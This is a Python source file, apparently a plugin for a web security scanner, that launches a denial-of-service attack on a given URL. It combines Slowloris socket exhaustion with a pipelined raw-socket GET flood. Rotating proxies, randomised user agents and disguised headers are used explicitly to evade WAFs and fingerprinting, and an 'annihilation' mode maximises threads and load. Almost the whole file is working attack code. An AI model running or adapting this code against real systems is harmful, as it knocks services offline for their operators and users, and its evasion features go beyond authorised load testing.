import socket
import time
import random
import ssl
import threading
from urllib.parse import urlparse
from ..models import CheckResult
from ..http_client import HttpClient, USER_AGENTS

def check(base_url, scenario, logger):
    """
    ELITE DoS ATTACK: Combines Slowloris, HTTP GET Flood, and Header Exhaustion.
    Uses Proxy Rotation to bypass WAFs and maximizes server pressure.
    """
    is_aggressive = scenario.config.get("aggressive", False)
    parsed = urlparse(base_url)
    target_ip = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    
    # Configuration
    target_socket_count = int(scenario.config.get("sockets", 2000))
    duration = int(scenario.config.get("duration", 60))
    
    if is_aggressive:
        # Respect user config but ensure it's at least "intense"
        # Adjusted for laptop safety: lowered floor from 2000 -> 500
        if target_socket_count < 500: target_socket_count = 500
        if duration < 60: duration = 60
        print(f"    [DoS] 🔥 TOTAL ANNIHILATION MODE: {target_socket_count} sockets for {duration}s")
    
    # Load proxies for rotation
    proxies = HttpClient._proxies
    dead_proxies = set()
    dead_proxies_lock = threading.Lock()
    
    stop_event = threading.Event()
    stats = {"connected": 0, "requests": 0, "dropped": 0, "blocked": 0}
    lock = threading.Lock()

    def get_proxy():
        # Bypass for localhost
        if "localhost" in base_url or "127.0.0.1" in base_url:
            return None

        if not proxies: return None
        
        # Pick a proxy that isn't dead
        # Optimistic approach: pick random, check if dead. 
        # Detailed filtering efficiently:
        for _ in range(50): # Try 50 times to find a live one to avoid looping forever
             p = random.choice(proxies)
             if p not in dead_proxies:
                 return p
        
        # If we failed to find one, maybe the pool is dirty. 
        # Check if we need to reset.
        if len(dead_proxies) >= len(proxies) * 0.9:
            with dead_proxies_lock:
                 # Double check inside lock
                 if len(dead_proxies) >= len(proxies) * 0.9:
                     print(f"    [DoS] ♻️  Proxy pool exhausted. Recycling {len(dead_proxies)} dead proxies...")
                     dead_proxies.clear()
        
        return random.choice(proxies) # Fallback

    def connect_via_proxy(proxy_str):
        """Attempts to establish a connection through an HTTP Proxy."""
        try:
            p_parsed = urlparse(proxy_str)
            p_host = p_parsed.hostname
            p_port = p_parsed.port or 80
            
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((p_host, p_port))
            
            # HTTP CONNECT for SSL or plain GET for non-SSL
            if parsed.scheme == "https":
                connect_req = f"CONNECT {target_ip}:{port} HTTP/1.1\r\nHost: {target_ip}:{port}\r\n\r\n"
                s.send(connect_req.encode())
                resp = s.recv(1024).decode()
                if "200" not in resp:
                    s.close()
                    return None
                # Wrap for SSL
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = context.wrap_socket(s, server_hostname=target_ip)
            return s
        except:
            # Mark as dead
            with dead_proxies_lock:
                 dead_proxies.add(proxy_str)
            return None

    def attack_vector_slowloris(sockets_to_manage):
        my_sockets = []
        while not stop_event.is_set():
            # Fill
            while len(my_sockets) < sockets_to_manage and not stop_event.is_set():
                p = get_proxy()
                s = None
                if p:
                    s = connect_via_proxy(p)
                else:
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(2)
                        if parsed.scheme == "https":
                            context = ssl.create_default_context()
                            context.check_hostname = False
                            context.verify_mode = ssl.CERT_NONE
                            s = context.wrap_socket(s, server_hostname=target_ip)
                        s.connect((target_ip, port))
                    except: s = None
                
                if s:
                    try:
                        s.send(f"GET {scenario.target} HTTP/1.1\r\n".encode())
                        s.send(f"Host: {target_ip}\r\n".encode())
                        s.send(f"User-Agent: {random.choice(USER_AGENTS)}\r\n".encode())
                        my_sockets.append(s)
                        with lock: stats["connected"] += 1
                    except: s.close()
                else:
                    with lock: stats["blocked"] += 1
                    time.sleep(0.01)

            # Pulse
            for s in list(my_sockets):
                try:
                    s.send(f"X-a: {random.randint(1, 1000)}\r\n".encode())
                except:
                    try: my_sockets.remove(s)
                    except: pass
                    with lock: stats["dropped"] += 1
            
            # AGGRESSIVE: No sleep or tiny sleep
            if not is_aggressive: time.sleep(random.uniform(0.1, 1.0))
            else: time.sleep(0.01)

    def attack_vector_flood():
        """
        RAW SOCKET FLOOD: Bypasses requests library overhead for maximum RPS.
        Uses Keep-Alive to pipeline requests on a single connection.
        """
        # Pre-build payload with HIGH STEALTH headers to pass WAF inspection
        # Randomize headers per thread to avoid fingerprinting
        ua = random.choice(USER_AGENTS)
        
        headers = [
            f"Host: {parsed.hostname}",
            f"User-Agent: {ua}",
            "Connection: keep-alive",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language: en-US,en;q=0.9",
            "Accept-Encoding: gzip, deflate, br",
            "Upgrade-Insecure-Requests: 1",
            "Sec-Fetch-Dest: document",
            "Sec-Fetch-Mode: navigate",
            "Sec-Fetch-Site: none",
            "Sec-Fetch-User: ?1",
            "Pragma: no-cache",
            "Cache-Control: no-cache",
            f"Via: 1.1 {random.choice(['google', 'bing', 'chrome-compression-proxy'])}"
        ]
        
        # Assemble HTTP/1.1 Request
        header_str = "\r\n".join(headers) + "\r\n\r\n"
        request_line = f"GET {scenario.target} HTTP/1.1\r\n"
        
        payload = (request_line + header_str).encode()
        
        while not stop_event.is_set():
            p = get_proxy()
            s = None
            
            # Connect
            if p:
                s = connect_via_proxy(p)
            else:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(3) # Short timeout for speed
                    if parsed.scheme == "https":
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        # randomize ciphers if possible or use default (usually fine)
                        s = context.wrap_socket(s, server_hostname=target_ip)
                    s.connect((target_ip, port))
                except: s = None
            
            if not s:
                with lock: stats["dropped"] += 1
                continue
                
            # BLAST
            try:
                # Send multiple requests per connection (Keep-Alive Pipelining)
                # USER DEMAND: "K's of logs". Increased per-socket batch to 1000.
                for _ in range(1000): # Send 1000 requests per socket open
                    if stop_event.is_set(): break
                    s.sendall(payload)
                    with lock: stats["requests"] += 1
                    
                    # Read minimal response to clear buffer (optional, but prevents blocking)
                    # For pure flood, we might ignore this, but server might stall window.
                    # Asynch read is hard here, so we just set non-blocking or short timeout
                    try:
                        s.settimeout(0.01) # Ultra short timeout
                        s.recv(128) # Just ack
                    except: pass
                    
            except Exception:
                with lock: stats["dropped"] += 1
            finally:
                try: s.close()
                except: pass
            
    # Launch threads
    threads = []
    # Mix vectors: 40% Slowloris (Connection exhaustion), 60% Flood (CPU/RPS exhaustion)
    # USER REQUEST: "WTF is the logs count" -> We need MAX FLOOD intensity.
    
    if is_aggressive:
        # PUSH TO LIMITS
        slowloris_threads = 50
        flood_threads = 100 
    else:
        slowloris_threads = 50
        flood_threads = 50
    
    # If explicit config for threads is provided, use it
    if scenario.config.get("threads"):
        t_total = int(scenario.config.get("threads"))
        flood_threads = int(t_total * 0.7)
        slowloris_threads = t_total - flood_threads
    
    sockets_per_thread = max(1, target_socket_count // max(1, slowloris_threads))
    
    print(f"    [DoS] Dispatching {slowloris_threads} Slowloris threads and {flood_threads} FAST FLOOD threads...")
    
    # Spawn in batches to avoid choking OS immediately
    batch_size = 50
    
    for i in range(0, slowloris_threads, batch_size):
        for _ in range(min(batch_size, slowloris_threads - i)):
            t = threading.Thread(target=attack_vector_slowloris, args=(sockets_per_thread,))
            t.daemon = True
            t.start()
            threads.append(t)
        time.sleep(0.1)
        
    for i in range(0, flood_threads, batch_size):
        for _ in range(min(batch_size, flood_threads - i)):
            t = threading.Thread(target=attack_vector_flood)
            t.daemon = True
            t.start()
            threads.append(t)
        time.sleep(0.1)
        
    # Duration
    time.sleep(duration)
    stop_event.set()
    
    for t in threads: t.join(timeout=1)
    
    # Analysis
    is_down = False
    try:
        # Check if server responds to a clean request
        c = HttpClient(base_url)
        r = c.send("GET", "/", timeout=5.0)
        if r.status_code >= 500: is_down = True
    except:
        is_down = True
        
    res_details = f"Requests: {stats['requests']}, Active Sockets: {stats['connected']}, Blocks: {stats['blocked']}, Server Down: {is_down}"
    
    if is_down:
        return CheckResult(scenario.id, scenario.type, "VULNERABLE", "CRITICAL", f"DoS SUCCESS: Server is DEAD. {res_details}")
    elif stats['blocked'] + stats['dropped'] > (stats['requests'] + stats['connected']):
        # Explicit user request: "consider critical findings as blocked" -> Now "SECURE" per user demand
        return CheckResult(scenario.id, scenario.type, "SECURE", "HIGH", f"DoS Mitigated by Target. {res_details}")
    elif stats['requests'] > 1000 or stats['connected'] > 100:
        return CheckResult(scenario.id, scenario.type, "VULNERABLE", "HIGH", f"DoS Effective (High Load). {res_details}")
    else:
        return CheckResult(scenario.id, scenario.type, "SECURE", "MEDIUM", f"Server resisted attack. {res_details}")
